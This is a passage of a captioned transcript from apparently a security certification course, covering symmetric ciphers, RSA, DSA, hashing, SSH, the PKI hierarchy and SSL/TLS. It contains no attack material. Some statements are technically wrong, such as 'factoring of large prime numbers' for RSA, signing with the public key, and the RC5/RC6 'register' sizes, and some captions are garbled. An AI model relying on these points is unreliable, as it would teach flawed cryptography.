00:06:50.070\nYou can watch packets being created,\ntransmitted across the wire.\n\n137\n00:06:50.070 --> 00:06:51.160\n>> And what was the name again?\n\n138\n00:06:51.160 --> 00:06:53.160\n>> Good Warriors of the .net.\n\n139\n00:06:53.160 --> 00:06:55.060\n.Net is imperium net.\n\n140\n00:06:55.060 --> 00:06:56.620\nRight?\nSo if you go search for\n\n141\n00:06:56.620 --> 00:06:59.470\nit, you'll find it out there\nin a variety of places.\n\n142\n00:06:59.470 --> 00:07:01.910\nSo it's kinda interesting and\nit's a really cool little video.\n\n143\n00:07:01.910 --> 00:07:06.630\nBut in there they actually show you bits\nbeing dumped in to a packet of a fixed\n\n144\n00:07:06.630 --> 00:07:09.550\nsize, so they have a little bucket,\na little metal packet there,\n\n145\n00:07:09.550 --> 00:07:11.210\nthat they dump the bits down a chute into.\n\n146\n00:07:11.210 --> 00:07:14.330\nAnd they're packaging them up, putting\na label on them, and sending them out.\n\n147\n00:07:14.330 --> 00:07:15.990\nYeah, warriors of the .net, exactly.\n\n148\n00:07:15.990 --> 00:07:20.000\nSending them out to the proxy, to then\nhave a label put on, or be sent out.\n\n149\n00:07:20.000 --> 00:07:21.320\nIt's actually a really neat little video,\nso\n\n150\n00:07:21.320 --> 00:07:23.550\nyou should probably take\na look at at some point.\n\n151\n00:07:23.550 --> 00:07:25.360\nIt's kind of cool and a lot of fun.\n\n152\n00:07:25.360 --> 00:07:26.730\n>> All right.\nDon't switch to me for\n\n153\n00:07:26.730 --> 00:07:27.430\nthe next five minutes.\n\n154\n00:07:27.430 --> 00:07:28.411\nI'm going to be watching that.\n\n155\n00:07:28.411 --> 00:07:29.247\n>> Okay.\nJust watch it without the sound, though.\n\n156\n00:07:29.247 --> 00:07:29.760\n>> [LAUGH] Because.\n\n157\n00:07:29.760 --> 00:07:31.990\n>> Because it is,\nit's got a music soundtrack in it.\n\n158\n00:07:31.990 --> 00:07:33.390\n>> Okay.\n>> Narration in the background.\n\n159\n00:07:33.390 --> 00:07:35.820\nAll right, so\nwe've got the DES algorithm, right?\n\n160\n00:07:35.820 --> 00:07:39.490\n56 bit key so you wanna guess is 56 bits.\n\n161\n00:07:39.490 --> 00:07:41.700\nTriple DES 168 bits.\n\n162\n00:07:41.700 --> 00:07:43.940\nMake sure we notice a block cipher,\nplease.\n\n163\n00:07:43.940 --> 00:07:45.667\nMake sure also we know\nit's not used anymore,\n\n164\n00:07:45.667 --> 00:07:47.853\nbut that doesn't mean it's\nnot important to know about.\n\n165\n00:07:47.853 --> 00:07:51.900\nWhen I say not used I mean formally and\nthe transmission of confidential data,\n\n166\n00:07:51.900 --> 00:07:53.135\nit is not recommended.\n\n167\n00:07:53.135 --> 00:07:55.946\nThere are many systems that still\nimplement triple DES today.\n\n168\n00:07:55.946 --> 00:07:58.329\nAnd it's used in the private\nsector all the time.\n\n169\n00:07:58.329 --> 00:08:00.730\nIt's just that in military and\nthe government sectors,\n\n170\n00:08:00.730 --> 00:08:03.270\nit's not considered as\nbeing as secure anymore.\n\n171\n00:08:03.270 --> 00:08:07.650\nAES, the Advanced Encryption Standard,\ncommonly known as the Rijndael Algorithm,\n\n172\n00:08:07.650 --> 00:08:11.376\nis gonna be a symmetric key algorithm,\nso it's a private key algorithm.\n\n173\n00:08:11.376 --> 00:08:14.340\nIt is going to be an iterated one\ncalled an iterated block cipher.\n\n174\n00:08:14.340 --> 00:08:17.850\nWhich simply works by repeating the same\noperations over and over and over again.\n\n175\n00:08:17.850 --> 00:08:20.758\nSo it multiple times will go through that.\n\n176\n00:08:20.758 --> 00:08:22.640\nIt's a 128-bit block size, so\n\n177\n00:08:22.640 --> 00:08:27.550\nwe just wanna know that the block size is\n128 bits and it has a variable key size.\n\n178\n00:08:27.550 --> 00:08:31.060\n128, 192, or 256-bit keys.\n\n179\n00:08:31.060 --> 00:08:33.920\nSo we have different key sizes for that.\n\n180\n00:08:33.920 --> 00:08:37.530\nThat makes it a very strong algorithm\ncuz we implement it with different\n\n181\n00:08:37.530 --> 00:08:40.060\nlevels of the key space, right?\n\n182\n00:08:40.060 --> 00:08:43.250\nSo we can have different key spaces and\ntherefore make it more secure for\n\n183\n00:08:43.250 --> 00:08:45.010\nthe more secure\ntransmissions that we need.\n\n184\n00:08:45.010 --> 00:08:47.170\nSo you wanna make sure\nyou're aware of that.\n\n185\n00:08:47.170 --> 00:08:52.580\nWe talked about RC4,\nthe RC series, RC4, RC5, RC6.\n\n186\n00:08:52.580 --> 00:08:56.030\nRC4 is implemented as a variable\nkey size stream cypher, so\n\n187\n00:08:56.030 --> 00:09:01.300\nRC4 is implemented as a variable key size\ncypher that is gonna be a stream cypher.\n\n188\n00:09:01.300 --> 00:09:05.700\nOperates on those bits as they go by, so\njust wanna make sure we're aware of that.\n\n189\n00:09:05.700 --> 00:09:11.240\nRC5 is gonna have 128-bit\nkey size associated with it.\n\n190\n00:09:11.240 --> 00:09:14.700\nIt's what we call a parameterized\nalgorithm, it has a variable block size so\n\n191\n00:09:14.700 --> 00:09:17.800\nit can operate on different\nblocks at different sizes,\n\n192\n00:09:17.800 --> 00:09:19.720\nwith variable key sizes as well.\n\n193\n00:09:19.720 --> 00:09:20.885\nAnd variable numbers of rounds.\n\n194\n00:09:20.885 --> 00:09:24.120\nThink about having a bunch\nof dials where you can just\n\n195\n00:09:24.120 --> 00:09:25.975\ndial up all the settings\nin all these things.\n\n196\n00:09:25.975 --> 00:09:29.700\nRC5 is gonna be one of those that you\ncould just literally set what you want,\n\n197\n00:09:29.700 --> 00:09:32.370\nand it kinda just operations\nbased on those combinations.\n\n198\n00:09:32.370 --> 00:09:36.310\nSo it's a very secure solution because\nyou have to get the exact combinations of\n\n199\n00:09:36.310 --> 00:09:38.400\nthings to understand how to wind it back.\n\n200\n00:09:38.400 --> 00:09:42.150\nAnd then RC6 is a symmetric key\nblock cypher, so it's a private key,\n\n201\n00:09:42.150 --> 00:09:45.490\nsingle key block cypher,\nthat is going to come from RC5.\n\n202\n00:09:45.490 --> 00:09:49.830\nIt's essentially derived from RC5\nwith two additional benefits.\n\n203\n00:09:49.830 --> 00:09:54.214\nWe use integer multiplication to\ndo some of the internal functions.\n\n204\n00:09:54.214 --> 00:09:56.830\nAnd we use a 4-bit working register,\n\n205\n00:09:56.830 --> 00:10:00.640\nwhereas RC5 uses a 2-bit register\nto do the internal working.\n\n206\n00:10:00.640 --> 00:10:03.179\nSo we double the size of\nthe register making it more secure.\n\n207\n00:10:03.179 --> 00:10:05.073\nSo it's like RC5 plus.\n\n208\n00:10:05.073 --> 00:10:06.240\n>> If you want to think of it that way.\n\n209\n00:10:06.240 --> 00:10:07.949\n>> [LAUGH] That's what RC6 is.\n\n210\n00:10:07.949 --> 00:10:10.681\nAnd then we have what's known as the DSA,\nDigital Signature Algorithm.\n\n211\n00:10:10.681 --> 00:10:12.305\nThe Digital Signature Algorithm.\n\n212\n00:10:15.015 --> 00:10:18.415\nWe've talked about digital signing before,\nand digitally signing things.\n\n213\n00:10:18.415 --> 00:10:22.260\nThis is going to be used\nin response to FIPS.\n\n214\n00:10:22.260 --> 00:10:25.470\nFIPS is the Federal Information Processing\nStandards for the US government.\n\n215\n00:10:25.470 --> 00:10:28.430\nThese are the standards that the US\ngovernment puts out that essentially\n\n216\n00:10:28.430 --> 00:10:33.050\nspecify how information processing\nhas to be handled for government and\n\n217\n00:10:33.050 --> 00:10:34.520\ngovernment related entities.\n\n218\n00:10:34.520 --> 00:10:37.630\nTo do so securely,\nto set standards that essentially\n\n219\n00:10:37.630 --> 00:10:41.020\nyou have to abide by a set of rules and\nimplementation guidance\n\n220\n00:10:41.020 --> 00:10:44.966\nthat anybody that works in the federal\ngovernment has to use in their systems.\n\n221\n00:10:44.966 --> 00:10:49.580\nAnd so FIPS 186-2 specifically, which is\nthe standard that we're talking about,\n\n222\n00:10:49.580 --> 00:10:53.160\nspecifies the use of the DSA,\nthe Digital Signature Algorithm.\n\n223\n00:10:53.160 --> 00:10:56.460\nSo we just want to make sure we're aware\nof the fact that there is a specific\n\n224\n00:10:56.460 --> 00:11:00.680\nalgorithm that the federal government has\nsaid hey, this is what we want to use,\n\n225\n00:11:00.680 --> 00:11:02.673\nwe use it according to\nthis particular guidance.\n\n226\n00:11:02.673 --> 00:11:05.400\nFOPS 186-2 is what we're\ngonna use specifically,\n\n227\n00:11:05.400 --> 00:11:09.300\nwe're going to use the DSA\nin response to that.\n\n228\n00:11:09.300 --> 00:11:12.050\nDigital Signature Algorithms,\njust be aware of that.\n\n229\n00:11:12.050 --> 00:11:13.390\nWe also have RSA.\n\n230\n00:11:13.390 --> 00:11:16.332\nRSA is probably one of the most widely and\nwell known algorithms in the world.\n\n231\n00:11:16.332 --> 00:11:18.370\nWidely used,\nwidely used algorithm in the world.\n\n232\n00:11:18.370 --> 00:11:24.344\nRSA, the acronym RSA, is gonna be derived\nfrom the last name of the three founders\n\n233\n00:11:24.344 --> 00:11:30.158\nor creators of the algorithm and the\ncompany that ultimately bears their name.\n\n234\n00:11:30.158 --> 00:11:33.645\nRivest, Shamir, and\nAdleman are the last names of\n\n235\n00:11:33.645 --> 00:11:37.954\nthe three mathematicians that\ncame up with the RSA algorithm.\n\n236\n00:11:37.954 --> 00:11:41.302\nRon Rivest, Adi Shamir, and\nI always forget Adleman.\n\n237\n00:11:41.302 --> 00:11:43.560\n>> I can't remember his name.\n\n238\n00:11:43.560 --> 00:11:45.690\n>> Anyway, it's Rivest,\nShamir and Adleman.\n\n239\n00:11:45.690 --> 00:11:49.370\nJust make sure you are aware of the fact\nthat that algorithm is actually made up\n\n240\n00:11:49.370 --> 00:11:50.405\nof their last names.\n\n241\n00:11:50.405 --> 00:11:51.520\nSo you wanna know that.\n\n242\n00:11:51.520 --> 00:11:55.760\nBut RSA is going to be interesting because\nthe algorithm is formed, and basically\n\n243\n00:11:55.760 --> 00:12:00.190\nthe secret ingredient of the algorithm,\nis the factoring of large prime numbers.\n\n244\n00:12:00.190 --> 00:12:04.940\nThis is the mathematical problem that the\nalgorithm uses to essentially create keys.\n\n245\n00:12:04.940 --> 00:12:07.430\nEvery algorithm has some sort\nof mathematical problem or\n\n246\n00:12:07.430 --> 00:12:12.040\nfunction in its heart that it uses for key\nderivation, for essentially deriving or\n\n247\n00:12:12.040 --> 00:12:13.600\ngenerating the keys.\n\n248\n00:12:13.600 --> 00:12:16.660\nThe RSA algorithm uses the factoring\nof large prime numbers.\n\n249\n00:12:16.660 --> 00:12:18.750\nNow, we're not talking about like 1 and\n3, right?\n\n250\n00:12:18.750 --> 00:12:23.900\nWe're talking about massive prime numbers,\nwith hundreds of places, right?\n\n251\n00:12:23.900 --> 00:12:26.550\nThousands of places out there.\n\n252\n00:12:26.550 --> 00:12:28.441\nAnd so it's very,\nvery large numbers, right.\n\n253\n00:12:28.441 --> 00:12:30.860\nNumbers that you and\nI normally would never even think of,\n\n254\n00:12:30.860 --> 00:12:33.530\nlet alone come across or\nknow about unless we looked them up.\n\n255\n00:12:33.530 --> 00:12:37.210\nBut they exist, and obviously there\nare a finite number of them, but\n\n256\n00:12:37.210 --> 00:12:38.260\nthey are out there.\n\n257\n00:12:38.260 --> 00:12:40.530\nAnd the RSA algorithm leverages those,\n\n258\n00:12:40.530 --> 00:12:43.640\nessentially harvesting them and\nusing them, in some sort of\n\n259\n00:12:43.640 --> 00:12:47.820\nspecific formula internally as it\ncooks to create the keys from that.\n\n260\n00:12:47.820 --> 00:12:50.090\nWe factor those and\nfigure out what they are.\n\n261\n00:12:50.090 --> 00:12:52.028\nAnd then that is essentially\nhow we generate that.\n\n262\n00:12:52.028 --> 00:12:57.550\nSo RSA is interesting, right, in the sense\nthat it is gonna use a very specific and\n\n263\n00:12:57.550 --> 00:13:00.060\nvery interesting way of\ngenerating its own keys.\n\n264\n00:13:00.060 --> 00:13:01.770\nWe've talked about message digests, right,\n\n265\n00:13:01.770 --> 00:13:05.090\nthat's what we get as our output of\nour hash when we're digitally signing.\n\n266\n00:13:05.090 --> 00:13:07.140\nSo we've been through,\nwe've talked about those.\n\n267\n00:13:07.140 --> 00:13:10.360\nI remember from a hashing perspective,\nhashing algorithms.\n\n268\n00:13:10.360 --> 00:13:14.600\nWe mentioned several but MD5 is usually\none of the ones that is really popular.\n\n269\n00:13:14.600 --> 00:13:16.810\nMessage Digest is what MD stands for.\n\n270\n00:13:16.810 --> 00:13:22.306\nSo MD5 puts out 128-bit fixed output\non the back end, want to know that.\n\n271\n00:13:22.306 --> 00:13:25.517\nSHA1, short for SHA160.\n\n272\n00:13:25.517 --> 00:13:29.520\nSHA, Secure Hashing Algorithm, 1 or\n\n273\n00:13:29.520 --> 00:13:32.720\n160 puts out 160 bits as\nthe output on the back end.\n\n274\n00:13:32.720 --> 00:13:36.820\nWe have SHA2, SHA2 is short for\n256, puts out 256 bits.\n\n275\n00:13:36.820 --> 00:13:41.920\nThere's a SHA512, puts out 512 bits,\nthat kind of thing.\n\n276\n00:13:41.920 --> 00:13:44.030\nJust make sure you're aware of that.\n\n277\n00:13:44.030 --> 00:13:45.880\nDid you know there's\nactually a SHA3 as well?\n\n278\n00:13:45.880 --> 00:13:47.845\n>> A SHA3?\n>> Yeah, you don't often hear about SHA3.\n\n279\n00:13:47.845 --> 00:13:48.375\n>> Three bits?\n\n280\n00:13:48.375 --> 00:13:50.480\n[LAUGH]\n>> No, no, no, surprisingly not.\n\n281\n00:13:50.480 --> 00:13:54.306\nYou know, out beyond SHA1 and\nSHA2, there's SHA3 specifically.\n\n282\n00:13:54.306 --> 00:13:58.945\nIt uses something called the sponge\nconstruction, as in SpongeBob.\n\n283\n00:13:58.945 --> 00:14:01.740\n>> [LAUGH]\n>> But, basically, what the sponge\n\n284\n00:14:01.740 --> 00:14:04.010\nconstruction does, and this is real,\nI'm not kidding about this, actually.\n\n285\n00:14:04.010 --> 00:14:05.113\nI was kidding about the Spongebob stuff.\n\n286\n00:14:05.113 --> 00:14:06.330\n>> [LAUGH]\n>> But not about SHA3.\n\n287\n00:14:06.330 --> 00:14:08.280\nIt uses a sponge construction.\n\n288\n00:14:08.280 --> 00:14:11.528\nAnd what that essentially means is\nthat the message blocks are XORed,\n\n289\n00:14:11.528 --> 00:14:13.908\nwe've talked about this,\ninto the initial bits.\n\n290\n00:14:13.908 --> 00:14:16.812\nAnd are going to be permuted,\nor permutated,\n\n291\n00:14:16.812 --> 00:14:20.170\na various amount of times\nas we roll through them.\n\n292\n00:14:20.170 --> 00:14:23.000\nSo we're gonna essentially take those,\nrun them through,\n\n293\n00:14:23.000 --> 00:14:26.890\nand then start doing stuff to them,\nright, XORing them as we go.\n\n294\n00:14:26.890 --> 00:14:30.160\nSo it's just an interesting approach, it's\nanother way of doing this and a lot of\n\n295\n00:14:30.160 --> 00:14:33.550\npeople don't realize, most people you\ntalk about SHA, yeah, SHA1 I know that.\n\n296\n00:14:33.550 --> 00:14:35.850\nYou may have heard of SHA2, 256.\n\n297\n00:14:35.850 --> 00:14:37.180\nNever heard of SHA3 before.\n\n298\n00:14:37.180 --> 00:14:38.720\nI asked, most people don't know it exists.\n\n299\n00:14:38.720 --> 00:14:39.910\nSo it's kind of interesting there.\n\n300\n00:14:39.910 --> 00:14:43.320\nI've talked about SSH in\nvarious episodes in the past\n\n301\n00:14:43.320 --> 00:14:44.720\nas we've been discussing things.\n\n302\n00:14:44.720 --> 00:14:48.375\nThe use of a secure transmission\nmechanism, Secure Shell, specifically,\n\n303\n00:14:48.375 --> 00:14:49.775\nis what SSH stands for.\n\n304\n00:14:49.775 --> 00:14:51.137\nThink of it as being the secure,\n\n305\n00:14:51.137 --> 00:14:54.478\nproper version that Telnet should have\nbeen when it grew up and never got to be.\n\n306\n00:14:54.478 --> 00:14:59.315\nAnd so remember that telnet is going\nto allow us to transmit essentially in\n\n307\n00:14:59.315 --> 00:15:01.690\na console or terminal fashion.\n\n308\n00:15:01.690 --> 00:15:05.040\nBut the downfall of Telnet was\nthat it transmitted in the clear.\n\n309\n00:15:05.040 --> 00:15:07.720\nNo user name and\npassword protection at all.\n\n310\n00:15:07.720 --> 00:15:12.480\nSo as a result if you sent something like\na log on credential to connect with system\n\n311\n00:15:12.480 --> 00:15:16.000\nand then used the terminal to administer\nit, you would send that on the clear.\n\n312\n00:15:17.050 --> 00:15:20.040\nPeople will be able to grab that and\nobviously compromise the credential.\n\n313\n00:15:20.040 --> 00:15:23.801\nSSH comes along and is essentially\nTelnet plus encryption, right, and\n\n314\n00:15:23.801 --> 00:15:25.228\nthat's what SSH becomes.\n\n315\n00:15:25.228 --> 00:15:29.009\nAnd so that's gonna help us to then\nobviously be able to transmit securely but\n\n316\n00:15:29.009 --> 00:15:32.556\nalso make sure that we know how to\nadminister and to do the things we need to\n\n317\n00:15:32.556 --> 00:15:36.220\ndo without anybody snooping,\nwhen it comes to finding our information.\n\n318\n00:15:36.220 --> 00:15:38.710\nSo, want to just keep an eye out for that.\n\n319\n00:15:38.710 --> 00:15:40.874\nMake sure that we know\nthe value of using SSH.\n\n320\n00:15:40.874 --> 00:15:42.432\nI want to go ahead and\n\n321\n00:15:42.432 --> 00:15:48.407\ntalk about some of the potential issues\nassociated with PKI really quickly.\n\n322\n00:15:48.407 --> 00:15:50.246\nNot issues but\njust some of the building blocks.\n\n323\n00:15:50.246 --> 00:15:53.256\nWe're gonna get in to the attacks\nagainst algorithms here in a minute.\n\n324\n00:15:53.256 --> 00:15:56.711\nBut we talked about all the building\nblocks in our vocabulary solution We\n\n325\n00:15:56.711 --> 00:15:59.770\nset up and talked about the certificate\nauthority, we set up and\n\n326\n00:15:59.770 --> 00:16:01.881\ntalked about the registration authority.\n\n327\n00:16:01.881 --> 00:16:04.723\nWe talked about the root and\nthe subordinate CA,\n\n328\n00:16:04.723 --> 00:16:07.993\nwe talked about\nthe certificates being x.509v3.\n\n329\n00:16:07.993 --> 00:16:09.639\nI know that, I think, I know, right?\n\n330\n00:16:09.639 --> 00:16:12.460\nIf I'm not mistaken, that we do have\na little picture and, as I've often said.\n\n331\n00:16:12.460 --> 00:16:15.864\nPictures are important to help us kind\nof crystallize that knowledge and\n\n332\n00:16:15.864 --> 00:16:17.210\nreally understand it.\n\n333\n00:16:17.210 --> 00:16:18.340\nSo are we good?\n\n334\n00:16:18.340 --> 00:16:19.700\n>> Yep.\n>> Can we go to Mike's machine for\n\n335\n00:16:19.700 --> 00:16:20.430\njust second?\n\n336\n00:16:20.430 --> 00:16:24.060\nLet's just take a look at what PKI\nis gonna visually appear as so\n\n337\n00:16:24.060 --> 00:16:26.070\nwe can really see that come to life.\n\n338\n00:16:26.070 --> 00:16:31.020\nSo we have up at the top on the left an\nenterprise root CA, so we're gonna be able\n\n339\n00:16:31.020 --> 00:16:36.260\nto see that that is the top of the trust\nhierarchy, the top of the PKI hierarchy.\n\n340\n00:16:36.260 --> 00:16:39.027\nWe have some subordinate\nCAs that are down below.\n\n341\n00:16:39.027 --> 00:16:43.981\nThey are the child of\nthe enterprise root CA.\n\n342\n00:16:43.981 --> 00:16:48.631\nThe subordinate CA is essentially going\nto issue certificates on behalf of\n\n343\n00:16:48.631 --> 00:16:50.713\nthe parent on behalf of the root.\n\n344\n00:16:50.713 --> 00:16:55.016\nAnd then, we have a client down there that\nis gonna be requesting a certificate from\n\n345\n00:16:55.016 --> 00:16:56.800\none of the subordinate CAs.\n\n346\n00:16:56.800 --> 00:17:01.170\nThat subordinate CA will itself\ngo over to the LDAP directory,\n\n347\n00:17:01.170 --> 00:17:04.980\nand validate whether or not that\nclient has a legitimate account and or\n\n348\n00:17:04.980 --> 00:17:06.990\nhas presented her limited credentials.\n\n349\n00:17:06.990 --> 00:17:10.410\nIf they have then the subordinate\nCA can issue the certificate.\n\n350\n00:17:10.410 --> 00:17:14.240\nBut we also have a registration\nauthority sitting up there and\n\n351\n00:17:14.240 --> 00:17:16.620\nif the registration authority\nis going to be used.\n\n352\n00:17:16.620 --> 00:17:20.450\nThen the registration authority will\ntake over that process of authenticating\n\n353\n00:17:20.450 --> 00:17:23.090\nthe client credential and\nauthenticating the request.\n\n354\n00:17:23.090 --> 00:17:25.850\nProxy, in other words,\non behalf of the subordinate CA,\n\n355\n00:17:25.850 --> 00:17:29.750\nensure that that's going to work and\nthat that information is valid.\n\n356\n00:17:29.750 --> 00:17:32.680\nAnd then, the subordinate CA does\nthe issuing at that point if\n\n357\n00:17:32.680 --> 00:17:33.760\neverything is good.\n\n358\n00:17:33.760 --> 00:17:35.750\nSo we may have a lateral\nconversation going out,\n\n359\n00:17:35.750 --> 00:17:37.850\neven though we don't have\narrows associated with it.\n\n360\n00:17:37.850 --> 00:17:42.075\nAnd then at the bottom, I believe we\nhave CRLs, Certificate Revolution.\n\n361\n00:17:42.075 --> 00:17:45.150\n>> [LAUGH]\n>> A Certification Revocation List\n\n362\n00:17:45.150 --> 00:17:46.500\ndistribution point.\n\n363\n00:17:46.500 --> 00:17:51.206\nThe CRL function is most likely gonna\nactually be sitting in one of the CAs,\n\n364\n00:17:51.206 --> 00:17:53.161\nprobably the subordinate CA.\n\n365\n00:17:53.161 --> 00:17:56.577\nMike was kind enough to break it out for\nus separately just to show us\n\n366\n00:17:56.577 --> 00:18:00.363\nwhat that function is, but most likely\njust sits in the subordinate CAs.\n\n367\n00:18:00.363 --> 00:18:04.330\nAnd what it does is it allows\nus to either old school, right?\n\n368\n00:18:04.330 --> 00:18:08.190\nPublishes CRL that is a file\nwe essentially download\n\n369\n00:18:08.190 --> 00:18:11.600\nthat we then look at and compare and\nsee if certificates are on that list.\n\n370\n00:18:11.600 --> 00:18:15.313\nIf they are, those certificates\nare seen as being no longer valid and\n\n371\n00:18:15.313 --> 00:18:17.628\nthen we should not use them or\naccept them.\n\n372\n00:18:17.628 --> 00:18:21.593\nNew school way of doing things,\nwe use an online protocol, right?\n\n373\n00:18:21.593 --> 00:18:25.809\nTo be able to check that CRL automatically\ninstead of having to manually download\n\n374\n00:18:25.809 --> 00:18:28.470\nthe list and open it up and\ndo the comparison.\n\n375\n00:18:28.470 --> 00:18:33.458\nThe online certificate status protocol,\nOCSP, is gonna be used to be able to\n\n376\n00:18:33.458 --> 00:18:37.775\ndo that transmission and\nthat exchange and validation and check.\n\n377\n00:18:37.775 --> 00:18:41.277\nMost modern systems today\nare using the online protocol, but\n\n378\n00:18:41.277 --> 00:18:45.939\nit can do and go either way, it's just\nthat it's an automated process that we do.\n\n379\n00:18:45.939 --> 00:18:49.936\nThe OCSP as opposed to the manual process,\nhaving to download the list and check it,\n\n380\n00:18:49.936 --> 00:18:52.450\nwhich is a little time consuming and\ntedious.\n\n381\n00:18:52.450 --> 00:18:55.640\nSo, we just wanna make sure we\nhave that thought process there.\n\n382\n00:18:55.640 --> 00:18:56.850\nWe may, by the way,\n\n383\n00:18:56.850 --> 00:19:00.810\nhave another role that's not listed\nthere called the validation authority.\n\n384\n00:19:00.810 --> 00:19:02.720\nSimilar to the registration authority,\n\n385\n00:19:02.720 --> 00:19:06.870\nvalidation authority stores all of these\ncertificates with their public keys.\n\n386\n00:19:06.870 --> 00:19:11.398\nAnd allows us to do a check against them\nas a consumer to validate that the key or\n\n387\n00:19:11.398 --> 00:19:14.202\nthe certificate is actually usable and\nvalid.\n\n388\n00:19:14.202 --> 00:19:17.667\nSo, when think about the validation\nauthority we often think about the CRL\n\n389\n00:19:17.667 --> 00:19:20.140\nfunction being associated\nwith that as well.\n\n390\n00:19:20.140 --> 00:19:23.060\nWe don't see the most diagrams most\npeople don't bother to break it out\n\n391\n00:19:23.060 --> 00:19:26.470\nseparately cuz it literally they\nsee that as a separate role.\n\n392\n00:19:26.470 --> 00:19:29.080\nBut in the formal documentation of PKI,\n\n393\n00:19:29.080 --> 00:19:31.900\nyou may occasionally come across\nthe discussion of validation authority.\n\n394\n00:19:31.900 --> 00:19:36.340\nSo just in case you see that, I just wanna\nmake sure you know about that as well.\n\n395\n00:19:36.340 --> 00:19:40.280\nSigned certificates that are signed by\nthe CA, versus self signed certificates.\n\n396\n00:19:40.280 --> 00:19:41.750\nLet's talk about that for a minute.\n\n397\n00:19:41.750 --> 00:19:45.080\nIt's always good to know that\ncertificates must always be signed.\n\n398\n00:19:45.080 --> 00:19:47.350\nAnd when we did the demo in\none of the prior episodes, and\n\n399\n00:19:47.350 --> 00:19:48.870\nMike had brought up that certificate for\n\n400\n00:19:48.870 --> 00:19:51.756\nus from [INAUDIBLE] we actually\npointed out and saw the others.\n\n401\n00:19:51.756 --> 00:19:54.240\nThe signature there and look,\nthey used the shy one and\n\n402\n00:19:54.240 --> 00:19:57.600\nRSA algorithm to do the signature and\nwhatever was there.\n\n403\n00:19:57.600 --> 00:20:02.390\nIf the CA signs the certificate then\nthe CA is essentially specifying and\n\n404\n00:20:02.390 --> 00:20:05.020\ncertifying that it is\nissuing the certificate and\n\n405\n00:20:05.020 --> 00:20:06.750\nthis identity is being used.\n\n406\n00:20:06.750 --> 00:20:08.700\nIf you self sign the certificate,\n\n407\n00:20:08.700 --> 00:20:11.320\nthen what happens is you\nare issuing the certificate.\n\n408\n00:20:11.320 --> 00:20:15.070\nYou being the user or the machine that\nis going to create the certificate,\n\n409\n00:20:15.070 --> 00:20:17.530\nand you're signing it yourself.\n\n410\n00:20:17.530 --> 00:20:19.018\nIt's a self signed certificate.\n\n411\n00:20:19.018 --> 00:20:20.731\nThe user creates public and\n\n412\n00:20:20.731 --> 00:20:24.319\nprivate keys using some sort\nof a tool whatever it may be.\n\n413\n00:20:24.319 --> 00:20:29.410\nAnd then the user uses their public key to\nsign that particular item and, as a result\n\n414\n00:20:29.410 --> 00:20:34.084\nof that, that is, they're gonna about\nit remember our identity, right?\n\n415\n00:20:34.084 --> 00:20:37.084\nAnd then we're going to be able\nto specify, yeah, it was us,\n\n416\n00:20:37.084 --> 00:20:38.325\nit was us that did that.\n\n417\n00:20:38.325 --> 00:20:43.055\nSo just be aware of the fact that we\ncan self sign around certificates.\n\n418\n00:20:43.055 --> 00:20:45.837\nIt's up to us to decide\nHow we wanna do that.\n\n419\n00:20:45.837 --> 00:20:47.477\nBut if we use a certificate authority,\n\n420\n00:20:47.477 --> 00:20:49.957\nwe use that certificate\nthat's been signed by the CA.\n\n421\n00:20:49.957 --> 00:20:53.447\nWe're essentially using that to\nrepresent the functionality into\n\n422\n00:20:53.447 --> 00:20:55.037\na created trust chain.\n\n423\n00:20:55.037 --> 00:20:56.867\n>> Right.\n>> A chain of trust that we propagate.\n\n424\n00:20:56.867 --> 00:21:00.050\nSo, we wanna think about that,\nare you showing the signature there?\n\n425\n00:21:00.050 --> 00:21:01.736\n>> Yeah, this is Google certificate and\n\n426\n00:21:01.736 --> 00:21:04.643\nyou can see it was actually issued\nby Google Internet Authority.\n\n427\n00:21:04.643 --> 00:21:08.716\nWhich would have been the issuing or\none of the subordinate CAs, but\n\n428\n00:21:08.716 --> 00:21:12.160\nyou can chain that back all\nthe way up to Geotrust Global.\n\n429\n00:21:12.160 --> 00:21:17.371\nWho would, in this case, be that root CA,\nand the root has the self-sign\n\n430\n00:21:17.371 --> 00:21:22.180\ncertificate issued to Geotrust,\nissued by Geotrust in this case.\n\n431\n00:21:22.180 --> 00:21:25.380\n>> Good, okay, very good, appreciate\nyou throwing that out there for us.\n\n432\n00:21:25.380 --> 00:21:30.230\nAll right, so just also quickly,\nSSL versus TLS [INAUDIBLE] go.\n\n433\n00:21:30.230 --> 00:21:31.110\n>> Let's see.\n\n434\n00:21:31.110 --> 00:21:35.016\nTLS is the new and improved version\nof SSL but they're not compatible.\n\n435\n00:21:35.016 --> 00:21:36.000\n>> Okay, all right.\n\n436\n00:21:36.000 --> 00:21:38.804\n>> [LAUGH] I mean, really,\nI mean they're very close,\n\n437\n00:21:38.804 --> 00:21:41.991\nvery similar in concept, but\nif your one end's using SSL,\n\n438\n00:21:41.991 --> 00:21:46.120\nthe other end is using TLS not gonna\nbe able to talk to each other.\n\n439\n00:21:46.120 --> 00:21:47.860\n>> Well, they could, but\nthey'll scream at each other and\n\n440\n00:21:47.860 --> 00:21:50.650\nwon't communicate cuz it's\na dysfunctional relationship.\n\n441\n00:21:50.650 --> 00:21:51.770\n>> But both very important,\n\n442\n00:21:51.770 --> 00:21:55.830\nit really is what drives everything\nwe do on the internet securely.\n\n443\n00:21:55.830 --> 00:21:57.890\n>> It is, you know where SSL came from?\n\n444\n00:21:57.890 --> 00:21:58.700\n>> I do not.\n\n445\n00:21:58.700 --> 00:21:59.430\n>> Netscape.\n\n446\n00:21:59.430 --> 00:22:02.540\n>> Really?\n>> Netscape created SSI originally,\n\n447\n00:22:02.540 --> 00:22:05.530\nas they did almost everything else\nvaluable before they got subsumed in that\n\n448\n00:22:05.530 --> 00:22:07.040\nnasty little browser work.\n\n449\n00:22:07.040 --> 00:22:09.973\n>> [LAUGH]\n>> We call those the Microsoft Words of\n\n450\n00:22:09.973 --> 00:22:10.879\nyears gone by.\n\n451\n00:22:10.879 --> 00:22:13.118\nSo actually,\njust interesting little aside, so\n\n452\n00:22:13.118 --> 00:22:16.067\nif you do watch the good words of\nthe .NET video that I mentioned.\n\n453\n00:22:16.067 --> 00:22:17.965\nYou will see because it\nwas shot a long time ago,\n\n454\n00:22:17.965 --> 00:22:19.935\nthey actually use a Netscape\nbrowser in there.\n\n455\n00:22:19.935 --> 00:22:20.460\n>> Really?\n>> Yes, [INAUDIBLE].\n\n456\n00:22:20.460 --> 00:22:21.155\n>> I'll be darned.\n\n457\n00:22:21.155 --> 00:22:24.375\nWell, they had the old ship wheel, right?\n\n458\n00:22:24.375 --> 00:22:27.095\n>> Yeah, the Captain Ahab wheel, yeah.\n\n459\n00:22:27.095 --> 00:22:30.155\nSo you'll actually see Netscape in there\nas a browser, which is kinda 